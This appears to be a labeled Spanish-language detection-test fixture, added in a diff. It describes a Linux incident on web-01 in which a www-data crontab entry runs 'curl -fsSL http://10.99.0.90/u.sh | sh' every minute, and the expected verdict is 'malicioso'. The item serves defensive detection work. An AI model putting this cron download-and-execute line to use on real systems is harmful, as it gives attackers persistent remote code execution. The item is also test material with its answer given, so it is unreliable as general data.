@@ -1,0 +1,21 @@
+{
+  "incidente_id": "CTRL-M02",
+  "host": "web-01",
+  "segmento": "servicios",
+  "alertas": [
+    {"alerta_id": "ALR-CTRL-M02-1", "regla_id": "R-T1053-modificacion-crontab", "tecnica": "T1053.003", "severidad": "media",
+     "descripcion": "Modificación del crontab de un usuario", "eventos": ["EVT-CM02-1"]},
+    {"alerta_id": "ALR-CTRL-M02-2", "regla_id": "R-T1105-descarga-desde-cron", "tecnica": "T1105", "severidad": "media",
+     "descripcion": "Tarea programada que descarga y ejecuta un script", "eventos": ["EVT-CM02-2", "EVT-CM02-3"]}
+  ],
+  "eventos": [
+    {"evento_id": "EVT-CM02-1", "ts": "2026-11-13T12:00:00Z", "host": "web-01", "tipo": "archivo",
+     "datos": {"ruta": "/var/spool/cron/crontabs/www-data", "operacion": "modificar", "usuario": "www-data", "proceso": "/usr/bin/crontab",
+               "contenido": "* * * * * curl -fsSL http://10.99.0.90/u.sh | sh"}},
+    {"evento_id": "EVT-CM02-2", "ts": "2026-11-13T12:01:00Z", "host": "web-01", "tipo": "proceso",
+     "datos": {"padre": "cron", "proceso": "/bin/sh", "usuario": "www-data", "cmdline": "/bin/sh -c curl -fsSL http://10.99.0.90/u.sh | sh"}},
+    {"evento_id": "EVT-CM02-3", "ts": "2026-11-13T12:01:00Z", "host": "web-01", "tipo": "conexion",
+     "datos": {"ip_origen": "10.20.0.11", "ip_destino": "10.99.0.90", "puerto_destino": 80, "protocolo": "tcp"}}
+  ],
+  "etiqueta_esperada": "malicioso"
+}
